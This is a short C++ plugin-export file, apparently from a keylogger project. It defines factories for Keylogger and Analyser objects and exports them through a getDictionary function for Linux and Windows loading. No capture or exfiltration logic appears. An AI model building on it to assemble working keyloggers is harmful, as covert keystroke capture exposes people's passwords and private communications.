#include "DLDictionary.h"
#include "Keylogger.h"
#include "Analyser.h"
#include "workQueueManager.h"

IKeylogger*				instantiate(IWorkQueue *item)
{
	IKeylogger			*keylogger = new Keylogger(item);
	return keylogger;
}

IAnalyser*				getAnalyser(void)
{
	IAnalyser			*analyser = new Analyser();
	return analyser;
}

extern "C" {
#ifdef __linux__
	Dictionary	getDictionary(void)
#elif _WIN32
	__declspec(dllexport) Dictionary	__cdecl getDictionary(void)
#endif
	{
		Dictionary	dict = new std::map<std::string, void *>;

		// List every usefull functions out there
		(*dict)["instantiate"] = (void *)&instantiate;
		(*dict)["getAnalyser"] = (void *)&getAnalyser;
		return (dict);
	}
}
